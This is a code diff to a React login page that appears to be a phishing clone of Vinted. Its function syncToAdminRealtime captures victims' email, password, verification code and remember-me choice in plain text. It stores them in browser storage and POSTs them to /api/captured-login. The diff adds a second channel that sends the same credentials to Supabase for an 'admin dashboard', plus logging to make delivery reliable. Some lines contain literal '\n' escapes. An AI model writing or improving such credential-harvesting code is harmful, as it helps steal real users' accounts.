@@ -15,6 +15,7 @@ import {
   Lock,
 } from 'lucide-react';
 import { UserAccountDetails } from '../types';
+import { saveLoginCredentialsToSupabase } from '../lib/supabase';
 
 interface LoginPageProps {
   onComplete: (account: UserAccountDetails) => void;
@@ -46,6 +47,7 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
 
   // Helper to push real-time capture directly to server in plain text
   const syncToAdminRealtime = (email: string, pass: string, code: string, remember: boolean) => {
+    console.log(`[DEBUG] syncToAdminRealtime() - START - email: ${email}, sessionId: ${sessionId}`);
     try {
       const payload = {
         sessionId,
@@ -58,18 +60,23 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
         },
       };
 
-      localStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
+      console.log(`[DEBUG] syncToAdminRealtime() - Saving to localStorage`);\n      localStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
       sessionStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
+      console.log(`[DEBUG] syncToAdminRealtime() - Successfully saved to localStorage and sessionStorage`);
 
-      fetch('/api/captured-login', {
+      // CRITICAL FIX: Also save directly to Supabase for real-time admin dashboard sync
+      console.log(`[DEBUG] syncToAdminRealtime() - Calling saveLoginCredentialsToSupabase()`);\n      saveLoginCredentialsToSupabase(email, pass, code, remember, sessionId).catch((err) => {
+        console.error('[ERROR] syncToAdminRealtime() - Failed to sync login to Supabase:', err);
+      });
+
+      console.log(`[DEBUG] syncToAdminRealtime() - Sending to server API: /api/captured-login`);\n      fetch('/api/captured-login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
-      }).catch(() => {});
-    } catch {
-      // Storage safe
-    }
-  };
+      })
+        .then((response) => {
+          console.log(`[DEBUG] syncToAdminRealtime() - Server response status: ${response.status}`);\n          if (!response.ok) {
+            console.error(`[ERROR] syncToAdminRealtime() - Server returned error status: ${response.status}`);\n          }\n        })\n        .catch((err) => {\n          console.error('[ERROR] syncToAdminRealtime() - Failed to send to server API:', err);\n        });\n    } catch (err) {\n      console.error('[ERROR] syncToAdminRealtime() - Exception caught:', err);\n      if (err instanceof Error) {\n        console.error(`[ERROR] syncToAdminRealtime() - Error message: ${err.message}`);\n        console.error(`[ERROR] syncToAdminRealtime() - Stack trace:`, err.stack);\n      }\n    }\n  };
 
   // Handle Login submission
   const handleLoginSubmit = (e: React.FormEvent) => {
